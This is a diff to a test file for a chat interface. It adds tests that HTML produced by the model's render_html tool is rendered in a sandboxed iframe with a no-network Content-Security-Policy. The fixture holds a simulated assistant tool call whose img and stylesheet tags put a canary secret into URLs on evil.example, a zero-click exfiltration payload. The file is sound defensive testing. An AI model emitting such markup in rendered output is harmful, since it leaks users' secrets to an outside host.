@@ -19,6 +19,8 @@ import { createElement } from 'react';
 import { describe, expect, it } from 'vitest';
 
 import { Markdown } from '@/ui/Markdown';
+import { MessageView } from '@/features/chat/MessageView';
+import { FRAME_CONTENT_SECURITY_POLICY, frameDocument } from '@/ui/frame';
 
 const CANARY = 'sk-live-EXFIL-CANARY';
 const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }));
@@ -61,5 +63,73 @@ describe('a model cannot make the page fetch a remote URL', () => {
     expect(csp).toMatch(/img-src/);
     expect(csp).not.toMatch(/img-src[^;]*\*/);
     expect(csp).not.toMatch(/img-src[^;]*https:(?!\/)/);
+  });
+});
+
+/**
+ * `render_html` is the other place model bytes become a rendered document, and
+ * the model writes the whole fragment rather than one URL.
+ *
+ * The comment above the iframe claimed "No scripts, no same-origin, no
+ * network". `sandbox=""` delivers the first two; it has never had anything to
+ * say about subresource loading, so the third was false and an `<img>` in the
+ * fragment was the same zero-click GET that markdown had.
+ */
+describe('a model cannot make its rendered HTML fetch a remote URL', () => {
+  const message = {
+    id: 'm1',
+    chatId: 'c1',
+    role: 'assistant' as const,
+    content: '',
+    createdAt: 0,
+    toolCalls: [
+      {
+        id: 't1',
+        name: 'render_html',
+        input: {
+          html: `<img src="https://evil.example/p.png?d=${CANARY}"><link rel="stylesheet" href="https://evil.example/s.css?d=${CANARY}">`,
+        },
+        output: 'ok',
+      },
+    ],
+  };
+
+  const frame = (): string =>
+    renderToStaticMarkup(
+      createElement(MessageView, {
+        message,
+        showThinking: false,
+        onRegenerate: () => {},
+        onEdit: () => {},
+      }),
+    );
+
+  it('renders the fragment inside a document that refuses every remote fetch', () => {
+    const html = frame();
+    // The iframe is really there and really carries the model's markup —
+    // otherwise the policy assertions below would be about nothing.
+    expect(html).toMatch(/srcdoc=/i);
+    expect(html).toContain('evil.example');
+
+    const doc = /srcdoc="([^"]*)"/i.exec(html)?.[1] ?? '';
+    expect(doc).toContain('Content-Security-Policy');
+    expect(doc).toContain('default-src &#x27;none&#x27;');
+    // Nothing that reaches the network is named. `data:` is the app's own
+    // images; a scheme that leaves the device is not in the policy at all.
+    expect(FRAME_CONTENT_SECURITY_POLICY).not.toMatch(/https?:/);
+    expect(FRAME_CONTENT_SECURITY_POLICY).not.toMatch(/\*/);
+  });
+
+  it('puts the policy before the model’s bytes, where a meta CSP still counts', () => {
+    // A `<meta>` policy governs what follows it. After the fragment it is
+    // decoration, so the ordering is the mechanism and not house style.
+    const doc = frameDocument('<img src="https://evil.example/p.png">');
+    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('evil.example'));
+  });
+
+  it('keeps the sandbox attribute, which stops the things a CSP does not', () => {
+    // The two are not substitutes: the CSP does not revoke same-origin or stop
+    // top-level navigation, and the sandbox does not stop a fetch.
+    expect(frame()).toContain('sandbox=""');
   });
 });
